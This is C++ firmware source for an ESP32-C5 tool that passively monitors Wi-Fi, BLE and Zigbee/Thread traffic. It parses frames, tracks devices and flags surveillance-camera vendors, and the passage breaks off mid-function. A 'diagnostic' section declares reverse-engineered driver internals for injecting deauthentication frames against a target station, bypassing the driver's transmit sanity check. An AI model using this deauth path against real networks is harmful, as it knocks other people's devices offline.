#include "bandwatch.h"
#include "bandwatch_core.h"
#include "surv_ouis.h"   // surveillance-OUI table (matched in firmware so the LCD can flag without a host)

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <host/ble_gap.h>
#include <nimble/hci_common.h>
#include <math.h>
#include <string.h>
#include <sdkconfig.h>
#include <esp_system.h>
#include <esp_ieee802154.h>
#include <SPI.h>
#include <FS.h>
#include <SD.h>

#if !CONFIG_SOC_WIFI_SUPPORT_5G
#error "Bandwatch needs a 5 GHz capable target (ESP32-C5). Select 'ESP32C5 Dev Module'."
#endif

// Tunables, the mode/channel model and shared state types live in bandwatch_core.h.

// ---------------------------------------------------------------------------------------------
// State (shared types are in bandwatch_core.h; instances live with their owning module)
// ---------------------------------------------------------------------------------------------
volatile Accum g_accum;
portMUX_TYPE g_accumMux = portMUX_INITIALIZER_UNLOCKED;
portMUX_TYPE g_devMux = portMUX_INITIALIZER_UNLOCKED;

WifiDev wifiDevs[kWifiDevSlots];
BleDev bleDevs[kBleDevSlots];
Dev154 devs154[kDev154Slots];

Hunt hunt;   // type in bandwatch_core.h
// Update the hunt counters when this frame is from our target. Callers hold g_devMux and have already
// evaluated the match for their radio kind (MAC vs 802.15.4 key).
void noteHuntHit(bool isTarget, int8_t rssi, uint32_t now) {   // IRAM_ATTR: see the decl in bandwatch_core.h
    if (hunt.active && isTarget) {
        hunt.rssi = rssi;
        hunt.lastMs = now;
        hunt.count = hunt.count + 1;
    }
}

Deauth deauth;   // type in bandwatch_core.h; the driver-internals path is with it in deauth_diag.cpp

// DIAGNOSTIC: beacon-injection self-test (see sendTestBeacon below), toggled with "txtest 1".
volatile bool txTestActive = false;
uint32_t txTestSent = 0, txTestFail = 0;
// PROOF OF CONCEPT ONLY (not a feature): raw TX radiates nothing from an unassociated STA, so this brings
// up a SoftAP to give the MAC a real BSS context and injects from WIFI_IF_AP instead. Toggled with
// "softap 1". Tears down promiscuous sniffing while active — see docs/DEVELOPER.md section 11.
wifi_interface_t txIface = WIFI_IF_STA;
bool softApPoc = false;

// Wall clock: the host sends "time <epoch>"; without it timestamps fall back to uptime (1970-based).
uint32_t epochBase = 0;         // epoch seconds at millis() == epochBaseMs
uint32_t epochBaseMs = 0;
bool epochValid = false;

volatile uint8_t currentChannelNum = 0;
BandMode bandMode = BAND_5G;

bool r154Running = false;
int enabledCount() {
    int n = 0;
    for (int i = 0; i < kChannelCount; i++) if (chanEnabled(i)) n++;
    return n;
}

ChannelState channels[kChannelCount];
int currentIdx = 0;                 // Index into kChannels
int parkedIdx = -1;                 // >= 0: stay on this channel instead of hopping
uint32_t dwellStartedMs = 0;
uint32_t sweepCount = 0;
bool monitorReady = false;
bool wifiRunning = false;
esp_err_t errCountry = ESP_FAIL, errBand = ESP_FAIL, errProto = ESP_FAIL, errPromisc = ESP_FAIL;

BleState bleScan;   // scan policy + bookkeeping (type and comment in bandwatch_core.h)
const char* bleScanModeName() {
    return bleScan.mode == BLE_SCAN_ACTIVE ? "active" : bleScan.mode == BLE_SCAN_PASSIVE ? "passive" : "auto";
}

namespace {

// Allow every 5 GHz channel the driver knows about (bits 1..28, see wifi_5g_channel_bit_t).
constexpr uint32_t kAll5gChannelMask = 0x1FFFFFFEu;

// IEEE 802.11 header (truncated – enough to read transmitter address)
typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration_id;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
    uint8_t addr4[6];
} wifi_ieee80211_mac_hdr_t;

typedef struct {
    wifi_ieee80211_mac_hdr_t hdr;
    uint8_t payload[0];
} wifi_ieee80211_packet_t;

// DIAGNOSTIC build 2: the driver-internal deauth path. These live in libnet80211.a with no public
// header. send_deauth_no_bss builds a deauth frame with the driver's own encoding (FC low byte 0xC0,
// i.e. a real "deauth" subtype on air) and TXes it via ic_tx_pkt, bypassing the raw-TX sanity check
// that rejects our hand-rolled [C0]/[A0] frames.
//   arg0: pointer to a word holding an ieee80211com* — g_ic+16 (STA) or g_ic+20 (AP); it panics on 0
//   arg1: target MAC (the station being kicked, ends up as DA), arg2: reason code
//
// Every numeric offset used by this path (g_ic+16/+20/+436/+440, hmac+312, desc+4/+20/+40/+52/+56) was
// reverse-engineered from the prebuilt libnet80211.a in Arduino-ESP32 core 3.3.11 (ESP-IDF 5.5.5). Nothing
// validates them at runtime, so a core that lays those structs out differently turns these reads and writes
// into memory corruption rather than a clean failure. Re-verify them before bumping the core (docs/DEVELOPER.md §9).
#if defined(ESP_ARDUINO_VERSION_MAJOR) && (ESP_ARDUINO_VERSION_MAJOR != 3 || ESP_ARDUINO_VERSION_MINOR != 3)
#warning "Arduino-ESP32 core is not 3.3.x: the driver-internal deauth offsets may no longer match (docs/DEVELOPER.md)."
#endif
extern "C" {
    int ieee80211_send_deauth_no_bss(void* hmacSlot, const uint8_t* mac, uint16_t reason);
    // DIAGNOSTIC build 3 pieces — the driver builds the frame itself; we only steer which MACs go where.
    void* ieee80211_alloc_deauth(void* hmacSlot, const uint8_t* macArg1, uint16_t reason);   // desc w/ reason at D+24, or NULL
    void  ieee80211_send_setup(void* hmacSlot, void* desc, int x, int y, const uint8_t* m4, const uint8_t* m5, const uint8_t* m6);
    void  ieee80211_set_tx_desc(void* hmacSlot, void* desc, int a, int b, int c);
    void  ic_tx_pkt(void* desc);
    extern void* g_ic;
}

// ---------------------------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------------------------
inline float clamp01(float v) {
    if (v < 0.0f) return 0.0f;
    if (v > 1.0f) return 1.0f;
    return v;
}

inline uint16_t macHash(const uint8_t* mac) {
    return (static_cast<uint16_t>(mac[4]) << 8) | mac[5];
}

// Replace control characters in a string captured off the air (SSID, BLE name, country code) with '.'.
// Bytes >= 0x80 are left alone so UTF-8 names survive. Without this a hostile or corrupt beacon can put
// control bytes in the table, where printJsonStr expands each to a 6-byte \u escape and blows past the
// serialRoom() budget that keeps JSON lines from being truncated mid-write.
void IRAM_ATTR sanitizeText(char* s, size_t n) {
    for (size_t i = 0; i < n && s[i]; i++) {
        const unsigned char c = static_cast<unsigned char>(s[i]);
        if (c < 0x20 || c == 0x7F) s[i] = '.';
    }
}

// ---------------------------------------------------------------------------------------------
// Promiscuous RX path (runs in the Wi-Fi task: count, hash, track, optionally copy – nothing else)
// ---------------------------------------------------------------------------------------------
// Parse the information elements of a beacon / probe response into the AP record.
// Body layout: 8 timestamp + 2 interval + 2 capability, then tagged parameters (id, len, data...).
void IRAM_ATTR parseBeaconIes(WifiDev& d, const uint8_t* payload, uint16_t sigLen) {
    if (sigLen < 36 + 4) return;   // header + fixed fields + FCS
    const uint16_t cap = payload[34] | (payload[35] << 8);
    const bool privacy = cap & 0x10;
    uint8_t sec = 0, pmf = 0, phy = 0, bw = 2;
    bool sawRsn = false, sawWpa = false;
    uint16_t off = 36;
    const uint16_t end = sigLen - 4;   // exclude FCS
    while (off + 2 <= end) {
        const uint8_t id = payload[off];
        const uint8_t len = payload[off + 1];
        const uint8_t* v = payload + off + 2;
        if (off + 2 + len > end) break;
        switch (id) {
            case 0:   // SSID
                if (len > 0 && len <= 32) { memcpy(d.ssid, v, len); d.ssid[len] = 0; sanitizeText(d.ssid, len); }
                break;
            case 7:   // Country
                if (len >= 2) { d.cc[0] = v[0]; d.cc[1] = v[1]; d.cc[2] = 0; sanitizeText(d.cc, 2); }
                break;
            case 11:  // BSS load
                if (len >= 3) { d.stations = v[0] | (v[1] << 8); d.util = v[2]; }
                break;
            case 45: phy |= 2; break;                       // HT capabilities -> 802.11n
            case 61:                                        // HT operation: secondary channel offset
                if (len >= 2 && ((v[1] & 0x03) == 1 || (v[1] & 0x03) == 3) && (v[1] & 0x04)) bw = 4;
                break;
            case 191: phy |= 4; break;                      // VHT capabilities -> 802.11ac
            case 192:                                       // VHT operation: channel width
                if (len >= 3) {
                    if (v[0] == 1) bw = (v[2] != 0) ? 16 : 8;
                    else if (v[0] == 2 || v[0] == 3) bw = 16;
                }
                break;
            case 48: {                                      // RSN
                sawRsn = true;
                if (len < 8) break;
                uint16_t p = 2 + 4;                         // version + group cipher
                const uint16_t pc = v[p] | (v[p + 1] << 8);
                // 32-bit math: a bogus pairwise-cipher count would wrap a uint16 back into range and
                // make the checks below pass on garbage offsets.
                const uint32_t after = static_cast<uint32_t>(p) + 2u + 4u * pc;
                if (after + 2u > len) break;
                p = static_cast<uint16_t>(after);
                const uint16_t ac = v[p] | (v[p + 1] << 8); p += 2;
                for (uint16_t k = 0; k < ac && p + 4 <= len; k++, p += 4) {
                    if (!(v[p] == 0x00 && v[p + 1] == 0x0F && v[p + 2] == 0xAC)) continue;
                    switch (v[p + 3]) {
                        case 1: case 3: case 5: case 11: sec |= 0x08; break;   // 802.1X (WPA2-Enterprise family)
                        case 2: case 4: case 6:          sec |= 0x04; break;   // PSK (WPA2-Personal)
                        case 8: case 9:                  sec |= 0x10; break;   // SAE (WPA3-Personal)
                        case 12: case 13:                sec |= 0x20; break;   // Suite-B 192 (WPA3-Enterprise)
                        case 18:                         sec |= 0x40; break;   // OWE (Enhanced Open)
                        default: break;
                    }
                }
                if (p + 2 <= len) {
                    const uint16_t rsncap = v[p] | (v[p + 1] << 8);
                    pmf = (rsncap & 0x40) ? 2 : (rsncap & 0x80) ? 1 : 0;
                }
                break;
            }
            case 221: // vendor specific
                if (len >= 4 && v[0] == 0x00 && v[1] == 0x50 && v[2] == 0xF2 && v[3] == 0x01) { sawWpa = true; sec |= 0x02; }
                break;
            case 255: // element ID extension
                if (len >= 1) {
                    if (v[0] == 35) phy |= 8;               // HE capabilities -> 802.11ax
                    else if (v[0] == 108) phy |= 16;        // EHT capabilities -> 802.11be
                }
                break;
            default: break;
        }
        off += 2 + len;
    }
    if (!sawRsn && !sawWpa) sec |= privacy ? 0x01 : 0x80;   // WEP or open
    if (phy == 0) phy = 1;
    d.sec = sec;
    d.pmf = pmf;
    d.phy = phy;
    d.bw = bw;
    d.flags |= 2;
}

// destOnly: this MAC was the *destination* (addr1) of someone else's frame, so we have never heard it
// transmit. Tier 1 evidence - @NitekryDPaul's technique for devices like Flock cameras that sleep through
// most dwell windows and only ever appear as a recipient. It is deliberately weaker than a transmitter
// sighting: it must never evict a device we have actually heard, and it never overwrites signal data,
// because the RSSI belongs to whoever sent the frame, not to this device.
void IRAM_ATTR trackWifiDevice(const uint8_t* mac, int8_t rssi, uint8_t fc0, const uint8_t* payload,
                               uint16_t sigLen, bool destOnly = false) {
    const uint32_t now = millis();
    const bool isBeacon = (fc0 == 0x80) || (fc0 == 0x50);   // beacon / probe response
    portENTER_CRITICAL_ISR(&g_devMux);
    const int i = devFindSlot(wifiDevs, kWifiDevSlots, mac);
    WifiDev& d = wifiDevs[i];
    const bool fresh = (d.lastMs == 0 || !macEq(d.mac, mac));
    if (destOnly && fresh && d.lastMs != 0 && !(d.flags & 4)) {
        portEXIT_CRITICAL_ISR(&g_devMux);   // slot holds a real transmitter: a tier-1 hit does not evict it
        return;
    }
    if (fresh) {
        memset(&d, 0, sizeof(d));
        memcpy(d.mac, mac, 6);
        d.maxRssi = rssi;
        d.surv = survLookup(mac);
        if (destOnly) d.flags |= 4;
    }
    if (!destOnly) d.flags &= ~4;   // heard it transmit: upgrade to tier 2
    if (destOnly) {
        if (d.frames < 65535) d.frames++;
        d.lastMs = now;
        portEXIT_CRITICAL_ISR(&g_devMux);
        return;                      // no rssi/ch/IE updates: none of that is this device's
    }
    d.rssi = rssi;
    if (rssi > d.maxRssi) d.maxRssi = rssi;
    if (d.frames < 65535) d.frames++;
    d.lastMs = now;
    d.ch = currentChannelNum;
    if (isBeacon) {
        d.flags |= 1;
        // Full IE parse on the first beacon, then every 16th (BSS load changes over time)
        if (!(d.flags & 2) || (d.beacons & 0x0F) == 0) parseBeaconIes(d, payload, sigLen);
        d.beacons++;
    }
    noteHuntHit(macEq(hunt.mac, mac), rssi, now);
    portEXIT_CRITICAL_ISR(&g_devMux);
}

void IRAM_ATTR promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA && type != WIFI_PKT_CTRL) return;
    const wifi_promiscuous_pkt_t* pkt = reinterpret_cast<const wifi_promiscuous_pkt_t*>(buf);
    if (pkt->rx_ctrl.rx_state != 0) return;  // CRC/PHY error: not real airtime we can attribute
    const uint16_t sigLen = pkt->rx_ctrl.sig_len;
    const uint16_t minLen = (type == WIFI_PKT_CTRL) ? 10 : 24;
    if (sigLen < minLen) return; // malformed
    const bool hasAddr2 = sigLen >= 16;
    const wifi_ieee80211_packet_t* ipkt = reinterpret_cast<const wifi_ieee80211_packet_t*>(pkt->payload);

    portENTER_CRITICAL_ISR(&g_accumMux);
    g_accum.frames += 1;
    g_accum.bytes += sigLen;
    if (pkt->rx_ctrl.rssi >= kStrongThresholdDbm) {
        g_accum.strong += 1;
    }
    if (hasAddr2) {
        const uint8_t* src = ipkt->hdr.addr2;  // Best-effort transmitter
        const uint16_t h = macHash(src);
        bool known = false;
        for (uint8_t i = 0; i < g_accum.macFill; i++) {
            if (g_accum.macHashes[i] == h) { known = true; break; }
        }
        if (!known && g_accum.macFill < kUniqueSlots) {
            const uint8_t slot = g_accum.macFill;
            g_accum.macHashes[slot] = h;
            g_accum.macFill = slot + 1;
            g_accum.unique += 1;
        }
    }
    portEXIT_CRITICAL_ISR(&g_accumMux);

    if (hasAddr2 && type != WIFI_PKT_CTRL) {
        trackWifiDevice(ipkt->hdr.addr2, pkt->rx_ctrl.rssi, pkt->payload[0], pkt->payload, sigLen);
        // Receiver-side sighting: a device that never transmits during our dwell is still named as addr1
        // by whoever talks to it. Unicast only - broadcast/multicast destinations are not devices.
        if (trackAddr1 && !(ipkt->hdr.addr1[0] & 0x01) && !macEq(ipkt->hdr.addr1, ipkt->hdr.addr2))
            trackWifiDevice(ipkt->hdr.addr1, pkt->rx_ctrl.rssi, 0, pkt->payload, sigLen, true);
    }

    uint8_t nh;
    CapFrame* slot = capReserve(nh);
    if (slot) {
        uint16_t n = sigLen;
        if (n > capSnapLen) n = capSnapLen;
        if (n > kCapMaxLen) n = kCapMaxLen;
        slot->ts_us = pkt->rx_ctrl.timestamp;
        slot->len = sigLen;
        slot->capLen = n;
        slot->rssi = pkt->rx_ctrl.rssi;
        slot->channel = currentChannelNum;
        memcpy(slot->data, pkt->payload, n);
        capCommit(nh);
    }
}

} // namespace

void resetAccum() {
    portENTER_CRITICAL(&g_accumMux);
    g_accum.frames = 0;
    g_accum.bytes = 0;
    g_accum.strong = 0;
    g_accum.unique = 0;
    g_accum.macFill = 0;
    for (int i = 0; i < kUniqueSlots; i++) g_accum.macHashes[i] = 0;
    portEXIT_CRITICAL(&g_accumMux);
}

namespace {

// ---------------------------------------------------------------------------------------------
// BLE scanning (runs in the NimBLE host task)
// ---------------------------------------------------------------------------------------------
// Bandwatch drives NimBLE's ble_gap_disc() directly instead of going through the Arduino BLEScan
// wrapper. The wrapper cannot give packet-accurate data: parseAdvertisement() *merges* every payload it
// sees from an address ("handles both ADV and Scan Response packets by merging them"), onResult() fires
// only once a scan response arrives when active scanning, and setAdvType() is recorded only on first
// sight. Driving the GAP API ourselves hands us one callback per on-air advertising report, with its own
// data, address, RSSI and PDU type - which is what a pcap needs. It also removes the library's result
// cache, and with it the heap-floor dance serviceBle() used to need.

// Advertising-channel access address; the PDU types are BT Core Spec Vol 6 Part B 2.3.
constexpr uint32_t kAdvAccessAddr = 0x8E89BED6;
enum : uint8_t { LL_ADV_IND = 0x0, LL_ADV_DIRECT_IND = 0x1, LL_ADV_NONCONN_IND = 0x2,
                 LL_SCAN_RSP = 0x4, LL_ADV_SCAN_IND = 0x6 };

// HCI advertising-report event types are NOT the same numbers as LL PDU types - map them.
uint8_t llPduTypeFromHci(uint8_t evtype) {
    switch (evtype) {
        case BLE_HCI_ADV_RPT_EVTYPE_ADV_IND:     return LL_ADV_IND;
        case BLE_HCI_ADV_RPT_EVTYPE_DIR_IND:     return LL_ADV_DIRECT_IND;
        case BLE_HCI_ADV_RPT_EVTYPE_SCAN_IND:    return LL_ADV_SCAN_IND;
        case BLE_HCI_ADV_RPT_EVTYPE_NONCONN_IND: return LL_ADV_NONCONN_IND;
        case BLE_HCI_ADV_RPT_EVTYPE_SCAN_RSP:    return LL_SCAN_RSP;
        default:                                 return LL_ADV_IND;
    }
}

// Minimal AD-structure parser: [len][type][data...]. Replaces what BLEAdvertisedDevice used to do for
// us, and unlike the library's version it only ever sees one packet's worth of data.
struct AdInfo {
    char name[21];
    uint16_t company, appearance, svc, svcData;
    int8_t txPower;
    uint8_t appleType;
    bool haveName;
};

void parseAdStructures(const uint8_t* p, uint16_t n, AdInfo& out) {
    memset(&out, 0, sizeof(out));
    out.txPower = 127;
    uint16_t i = 0;
    while (i + 1 < n) {
        const uint8_t len = p[i];
        if (len == 0 || i + 1 + len > n) break;
        const uint8_t type = p[i + 1];
        const uint8_t* v = p + i + 2;
        const uint8_t vlen = len - 1;
        switch (type) {
            case 0x08: case 0x09: {                       // shortened / complete local name
                const uint8_t c = vlen < sizeof(out.name) - 1 ? vlen : sizeof(out.name) - 1;
                memcpy(out.name, v, c); out.name[c] = 0;
                sanitizeText(out.name, c);
                out.haveName = true;
                break;
            }
            case 0x0A: if (vlen >= 1) out.txPower = static_cast<int8_t>(v[0]); break;   // TX power level
            case 0x19: if (vlen >= 2) out.appearance = v[0] | (v[1] << 8); break;       // appearance
            case 0x02: case 0x03:                                                       // 16-bit service UUIDs
                if (vlen >= 2 && !out.svc) out.svc = v[0] | (v[1] << 8);
                break;
            case 0x16:                                                                  // 16-bit service data
                if (vlen >= 2 && !out.svcData) out.svcData = v[0] | (v[1] << 8);
                break;
            case 0xFF:                                                                  // manufacturer specific
                if (vlen >= 2) {
                    out.company = v[0] | (v[1] << 8);
                    if (out.company == 0x004C && vlen >= 3) out.appleType = v[2];
                }
                break;
            default: break;
        }
        i += 1 + len;
    }
}

// Build one LINKTYPE_BLUETOOTH_LE_LL_WITH_PHDR record body (without the 10-byte pseudo-header, which
// sdWriteFrame/the host writer prepend from f.channel and f.rssi, exactly as radiotap is prepended for
// Wi-Fi): access address, LL header, AdvA, [TargetA], AdvData, CRC.
uint16_t buildBleLlFrame(uint8_t* out, const uint8_t* addr, uint8_t addrType, uint8_t pduType,
                         const uint8_t* adv, uint16_t advLen) {
    // The legacy advertising header's length field is 6 bits and covers AdvA + AdvData, so AdvData tops
    // out at 0x3F-6 = 57. Truncate rather than mask: a masked over-long length wraps to a small bogus
    // value and Wireshark then mis-dissects the whole record.
    const bool direct = (pduType == LL_ADV_DIRECT_IND);
    uint16_t payload = direct ? 0 : advLen;
    if (payload > 57) payload = 57;
    uint8_t* p = out;
    putLE32(p, kAdvAccessAddr); p += 4;
    uint8_t hdr0 = pduType & 0x0F;
    if (addrType != BLE_ADDR_PUBLIC) hdr0 |= 0x40;          // TxAdd: AdvA is a random address
    // RxAdd is left clear: the HCI report never carries TargetA's address type, and guessing it would
    // write a fabricated fact into the capture.
    *p++ = hdr0;
    *p++ = static_cast<uint8_t>((6 + (direct ? 6 : 0) + payload) & 0x3F);
    memcpy(p, addr, 6); p += 6;                              // AdvA, little-endian on air
    if (direct) { memset(p, 0, 6); p += 6; }                 // TargetA is not surfaced: zeroed, but present
    if (payload) { memcpy(p, adv, payload); p += payload; }
    *p++ = 0; *p++ = 0; *p++ = 0;                            // CRC we do not have (flags say "not checked")
    return static_cast<uint16_t>(p - out);
}

void trackBleDevice(const uint8_t* mac, int8_t rssi, uint8_t addrType, const AdInfo& ad, uint8_t bflags) {
    const uint32_t now = millis();
    bool isNew = false;
    portENTER_CRITICAL(&g_devMux);
    const int i = devFindSlot(bleDevs, kBleDevSlots, mac);
    BleDev& d = bleDevs[i];
    if (d.lastMs == 0 || !macEq(d.mac, mac)) {
        memset(&d, 0, sizeof(d));
        memcpy(d.mac, mac, 6);
        d.maxRssi = rssi;
        d.txPower = 127;
        d.surv = survLookup(mac);
        isNew = true;
    }
    d.rssi = rssi;
    if (rssi > d.maxRssi) d.maxRssi = rssi;
    if (d.adv < 65535) d.adv++;
    d.lastMs = now;
    d.addrType = addrType;
    if (ad.haveName && ad.name[0]) strncpy(d.name, ad.name, sizeof(d.name));
    if (ad.company) d.company = ad.company;
    if (ad.appleType) d.appleType = ad.appleType;
    if (ad.appearance) d.appearance = ad.appearance;
    if (ad.txPower != 127) d.txPower = ad.txPower;
    if (ad.svc) d.svc = ad.svc;
    if (ad.svcData) d.svcData = ad.svcData;
    d.flags |= bflags;
    noteHuntHit(macEq(hunt.mac, mac), rssi, now);
    const bool named = d.name[0] != 0;
    portEXIT_CRITICAL(&g_devMux);
    // Only a scannable advertiser can answer a SCAN_REQ, so asking for an active window for anything else
    // would transmit for nothing. Flag only; the actual switch happens in serviceBle() on the loop task,
    // because restarting discovery from inside the GAP callback would re-enter the host.
    if (isNew && !named && (bflags & 4)) bleScan.activeUntilMs = now + kBleActiveWindowMs;
}

// One on-air advertising report. Runs in the NimBLE host task.
int bleGapEvent(struct ble_gap_event* event, void* arg) {
    (void)arg;
    if (event->type == BLE_GAP_EVENT_DISC) {
        const struct ble_gap_disc_desc& d = event->disc;
        const int8_t rssi = static_cast<int8_t>(d.rssi);
        AdInfo ad;
        parseAdStructures(d.data, d.length_data, ad);
        const uint8_t pdu = llPduTypeFromHci(d.event_type);
        const uint8_t bflags = ((pdu == LL_ADV_IND || pdu == LL_ADV_DIRECT_IND) ? 1 : 0)   // connectable
                             | 2                                                            // legacy adv
                             | ((pdu == LL_ADV_IND || pdu == LL_ADV_SCAN_IND) ? 4 : 0);     // scannable
        // ble_addr_t.val is little-endian (as it goes on air). Everything that displays or keys on a MAC
        // - the device table, the LCD, the dashboard, OUI lookup, the randomized-address bit, hunt
        // matching - expects the conventional MSB-first order, so reverse it here. The pcap builder below
        // deliberately keeps the raw little-endian bytes, because that is what the wire format wants.
        uint8_t mac[6];
        for (int i = 0; i < 6; i++) mac[i] = d.addr.val[5 - i];
        trackBleDevice(mac, rssi, d.addr.type, ad, bflags);
        bleScan.advSeen = bleScan.advSeen + 1;

        uint8_t nh;                                  // same single-producer discipline as the Wi-Fi path
        CapFrame* slot = capReserve(nh);
        if (slot) {
            const uint16_t n = buildBleLlFrame(slot->data, d.addr.val, d.addr.type, pdu,
                                               d.data, d.length_data);
            slot->ts_us = micros();
            slot->len = n;
            slot->capLen = n > capSnapLen ? capSnapLen : n;
            slot->rssi = rssi;
            slot->channel = 39;   // the HCI report does not say which of 37/38/39 it arrived on
            capCommit(nh);
        }
    } else if (event->type == BLE_GAP_EVENT_DISC_COMPLETE) {
        bleScan.scanDone = true;
    }
    return 0;
}

} // namespace

void startBle() {
    if (!bleScan.inited) {
        BLEDevice::init("bandwatch");   // brings up the NimBLE host; we drive discovery ourselves
        bleScan.inited = true;
    }
    struct ble_gap_disc_params p = {};
    p.itvl = 160;            // 100 ms in 0.625 ms units
    p.window = 128;          // 80 ms
    p.passive = bleScan.active ? 0 : 1;   // bleScan.active = what we decided to run
    p.filter_duplicates = 0; // every advertisement, not just the first from each address
    p.limited = 0;
    bleScan.scanDone = false;
    const int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, BLE_HS_FOREVER, &p, bleGapEvent, nullptr);
    if (rc != 0 && rc != BLE_HS_EALREADY && serialRoom(120))
        Serial.printf("{\"t\":\"err\",\"msg\":\"ble_gap_disc failed rc=%d\"}\n", rc);
}

void stopBle() {
    if (!bleScan.inited) return;
    ble_gap_disc_cancel();
    BLEDevice::deinit(false);   // keep controller memory so BLE can be re-initialised later
    bleScan.inited = false;
}

// Discovery runs continuously (BLE_HS_FOREVER) and keeps no result cache, so there is nothing to recycle.
// This restarts it if the host ever ends discovery, and applies the passive/active policy.
void serviceBle() {
    if (bandMode != BAND_BLE || !bleScan.inited) return;
    if (bleScan.scanDone) {
        bleScan.cycles++;
        bleScan.scanDone = false;
        startBle();
        return;
    }
    // A capture must not be half passive and half active: whatever is running when recording starts stays.
    if (capActive) return;
    bool want = bleScan.active;
    switch (bleScan.mode) {
        case BLE_SCAN_PASSIVE: want = false; break;
        case BLE_SCAN_ACTIVE:  want = true;  break;
        case BLE_SCAN_AUTO:    want = static_cast<int32_t>(bleScan.activeUntilMs - millis()) > 0; break;
    }
    if (want == bleScan.active) return;
    const uint32_t now = millis();
    if (now - bleScan.lastSwitchMs < kBleSwitchMinMs) return;   // rate limit: restarting discovery costs a gap
    bleScan.lastSwitchMs = now;
    bleScan.switches++;
    bleScan.active = want;
    ble_gap_disc_cancel();
    startBle();
}

namespace {

// ---------------------------------------------------------------------------------------------
// IEEE 802.15.4 (Zigbee / Thread) sniffing. The driver's callbacks run in ISR context.
// ---------------------------------------------------------------------------------------------
volatile uint32_t rx154Count = 0;

// Classify the MAC payload: Zigbee NWK header, Zigbee Green Power, or 6LoWPAN (Thread).
inline uint8_t IRAM_ATTR classify154(const uint8_t* pl, uint16_t n, bool macSecured) {
    if (macSecured) return 4;                       // encrypted at MAC level: Thread does this, Zigbee does not
    if (n < 2) return 0;
    const uint8_t b = pl[0];
    if ((b & 0xE0) == 0x60 || (b & 0xF8) == 0xC0 || (b & 0xF8) == 0xE0 || (b & 0xC0) == 0x80 || b == 0x41) return 3; // 6LoWPAN IPHC / FRAG / mesh / IPv6
    const uint8_t ver = (b >> 2) & 0x0F;
    if (ver == 2) return 1;                         // Zigbee (Pro)
    if (ver == 3) return 2;                         // Zigbee Green Power
    return 0;
}

void IRAM_ATTR track154(const uint8_t* key, bool hasExt, uint16_t pan, uint16_t shortAddr, int8_t rssi, uint8_t lqi,
                        uint8_t proto, uint8_t flagBits) {
    const uint32_t now = millis();
    portENTER_CRITICAL_ISR(&g_devMux);
    const int i = dev154FindSlot(devs154, kDev154Slots, key);
    Dev154& d = devs154[i];
    if (d.lastMs == 0 || !key8Eq(d.key, key)) {
        memset(&d, 0, sizeof(d));
        memcpy(d.key, key, 8);
        d.maxRssi = rssi;
        d.shortAddr = 0xFFFF;
        d.pan = 0xFFFF;
    }
    d.rssi = rssi;
    if (rssi > d.maxRssi) d.maxRssi = rssi;
    if (d.frames < 65535) d.frames++;
    d.lastMs = now;
    d.ch = currentChannelNum;
    d.lqi = lqi;
    if (hasExt) d.flags |= 1;
    if (shortAddr != 0xFFFF) d.shortAddr = shortAddr;
    if (pan != 0xFFFF) d.pan = pan;
    if (proto) d.proto = proto;
    d.flags |= flagBits;
    noteHuntHit(hunt.kind == 1 && key8Eq(hunt.key, key), rssi, now);
    portEXIT_CRITICAL_ISR(&g_devMux);
}

} // namespace (the driver callback needs C linkage)

extern "C" void IRAM_ATTR esp_ieee802154_receive_done(uint8_t* frame, esp_ieee802154_frame_info_t* info) {
    // frame[0] = PSDU length incl. the 2 FCS bytes, which the radio replaces with RSSI/LQI.
    const uint16_t len = frame[0];
    const uint8_t* p = frame + 1;
    const int8_t rssi = info->rssi;
    if (len >= 5) {
        const uint16_t n = len - 2;   // MHR + payload, without the pseudo-FCS
        const uint16_t fc = p[0] | (p[1] << 8);
        const uint8_t ftype = fc & 0x07;
        const bool secured = fc & 0x08;
        const bool panComp = fc & 0x40;
        const uint8_t dstMode = (fc >> 10) & 3;
        const uint8_t srcMode = (fc >> 14) & 3;
        const uint8_t ver = (fc >> 12) & 3;
        uint16_t off = 3;   // fc + seq

        portENTER_CRITICAL_ISR(&g_accumMux);
        g_accum.frames += 1;
        g_accum.bytes += n;
        if (rssi >= kStrongThresholdDbm) g_accum.strong += 1;
        portEXIT_CRITICAL_ISR(&g_accumMux);

        uint16_t dstPan = 0xFFFF, srcPan = 0xFFFF, shortAddr = 0xFFFF;
        uint8_t key[8];
        bool haveSrc = false, hasExt = false;
        if (ver <= 1) {
            if (dstMode) { if (off + 2 <= n) { dstPan = p[off] | (p[off + 1] << 8); } off += 2; off += (dstMode == 2) ? 2 : 8; }
            if (srcMode) {
                if (!panComp) { if (off + 2 <= n) srcPan = p[off] | (p[off + 1] << 8); off += 2; }
                else srcPan = dstPan;
                if (srcMode == 2 && off + 2 <= n) {
                    shortAddr = p[off] | (p[off + 1] << 8);
                    key[0] = 0xFF; key[1] = 0xFE; key[2] = srcPan & 0xFF; key[3] = srcPan >> 8;
                    key[4] = shortAddr & 0xFF; key[5] = shortAddr >> 8; key[6] = 0; key[7] = 0;
                    haveSrc = true;
                    off += 2;
                } else if (srcMode == 3 && off + 8 <= n) {
                    for (int i = 0; i < 8; i++) key[i] = p[off + 7 - i];   // big-endian display order
                    haveSrc = hasExt = true;
                    off += 8;
                }
            }
            if (haveSrc) {
                if (secured) {
                    // auxiliary security header: 1 control byte + 4 frame counter + key identifier
                    if (off < n) {
                        const uint8_t sc = p[off];
                        const uint8_t kim = (sc >> 3) & 3;
                        off += 5 + (kim == 0 ? 0 : kim == 1 ? 1 : kim == 2 ? 5 : 9);
                    }
                }
                uint8_t proto = 0, flagBits = 0;
                if (ftype == 0) {                       // beacon
                    flagBits |= 2;
                    if (off + 2 <= n) {
                        const uint16_t sf = p[off] | (p[off + 1] << 8);
                        if (sf & 0x8000) flagBits |= 4;  // association permit
                        uint16_t q = off + 2;
                        if (q < n) { const uint8_t gts = p[q]; q += 1 + ((gts & 7) ? 1 + 3 * (gts & 7) : 0); }
                        if (q < n) { const uint8_t pa = p[q]; q += 1 + 2 * (pa & 7) + 8 * ((pa >> 4) & 7); }
                        if (q < n) {
                            const uint8_t pid = p[q];
                            if (pid == 0x00) proto = 1;      // Zigbee beacon payload (protocol id 0)
